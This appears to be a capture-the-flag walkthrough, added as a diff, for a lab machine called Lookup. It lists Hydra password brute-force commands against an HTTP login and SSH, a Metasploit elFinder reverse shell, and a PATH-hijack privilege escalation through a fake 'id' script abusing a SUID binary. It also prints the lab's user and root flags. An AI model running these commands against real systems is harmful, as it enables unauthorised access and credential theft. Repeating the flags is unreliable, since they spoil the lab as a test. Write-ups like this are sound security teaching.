@@ -1,0 +1,107 @@
+1. Directory bruteforcing ( Gobuster )
+	>> ../login.php
+
+2. User Enumeration ( Custom Script - provided in same directory )
+	>> pyhton3 script.py
+
+3. Password bruteforcing ( Hydra )
+	>> hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-form-post "/login.php:username=^USER^&password=^PASS^:Wrong" -v
+	>> hydra -l <username> -P <password-list> <target-IP> -t <threads> <protocol>
+
+	    -l <username> → Specify a single username.
+
+	    -L <username-list> → Use a list of usernames.
+
+	    -p <password> → Try a single password.
+
+	    -P <password-list> → Use a wordlist of passwords.
+
+	    <target-IP> → IP or domain of the target.
+
+	    -t <threads> → Number of threads (default is 16).
+	    
+	    <protocol> → Service to attack (e.g., ssh, ftp, http, etc.).
+	>> hydra --> username="jose" : password:"password123"
+
+4. Added the new subdomian (files.lookup.thm ) in the /etc/hosts
+
+5. Reverse Shell ( msfconsole ) 
+	>> search elfinder 
+	>> set RHOST files.lookup.thm
+	>> set LHOST tun0
+	>> run
+	>> shell
+	>> python3 -c 'import pty; pty.spawn("/bin/bash")' --> to run the terminal 
+	
+6. ls -la /home for checking which all files are there --> so there is a ".passwords" and "user.txt" but to excess it we need the root privelege  
+
+7. now by using this ( Privilege Escalation )
+	>> find / -perm /4000 2>/dev/null
+	
+	>> 1) find / → Search from the root (/) directory
+
+	    .	The find command is used to search for files and directories.
+
+	    .	/ tells it to start searching from the root directory (i.e., search the entire system).
+
+	   2) -perm /4000 → Find files with the SUID (Set User ID) bit set
+
+	    .	-perm specifies the permission mode to search for.
+
+	    .	/4000 means:
+
+		.	4 → SUID (Set User ID) bit is set
+
+		.	000 → The other permissions (owner, group, others) don’t matter.
+
+	    .    SUID allows a file to run with the privileges of its owner, which is often root.
+
+	    3) 2>/dev/null → Suppress permission errors
+
+	    	.	2> redirects stderr (error messages) to /dev/null (a "black hole" that discards output).
+
+	    	.	This prevents permission-denied messages from cluttering the output.
+	    	
+8. Now we can see that /usr/sbin/pwm is not a usual 
+
+9. so to check it's priveleges type --> "ls -la /usr/sbin/pwm"                	
+	>> we will get -rwsr-sr-x 1 root root 17176 Jan 11  2024 /usr/sbin/pwm >> means it has root privelege 
+
+10. type pwm and we would get this 
+	>> www-data@lookup:/tmp$ pwm  
+		[!] Running 'id' command to extract the username and user ID (UID)
+		[!] ID: www-data
+		[-] File /home/www-data/.passwords not found
+		
+11. now when we type --> "id"
+	>> we would get --> uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+
+12. touch /tmp/id --> to make a empty id 
+
+13. echo '#!/bin/bash' > /tmp/id --> add shebang to id
+
+14. echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id --> to make our own id 
+
+15. type --> export PATH=/tmp:$PATH 
+	>> By placing /tmp at the beginning, any script or binary in /tmp will be executed before system binaries.
+
+16. now when we type --> "id"
+	>> we would get --> uid=1000(think) gid=1000(think) groups=1000(think) 
+
+17. Now try running pwm 
+	>> we would get the .passwords
+
+18. save these passwords in a new file or get it from same directory in the repo 
+	>> i.e. passwords.txt
+
+19. ssh login Bruteforcing ( Hydra ) 
+
+	>> hydra -l think -P passwords.txt ssh://lookup.thm 
+
+	>> [22][ssh] host: lookup.thm   login: think   password: josemario.AKA(think)
+
+20. cat user.txt --> 38375fb4dd8baa2b2039ac03d92b820e >> "user flag"
+
+21. look '' /root/root.txt , password (think) -->  password: josemario.AKA(think)
+
+22. And finally we'll get the root flag --> 5a285a9f257e45c68bb6c9f9f57d18e8 
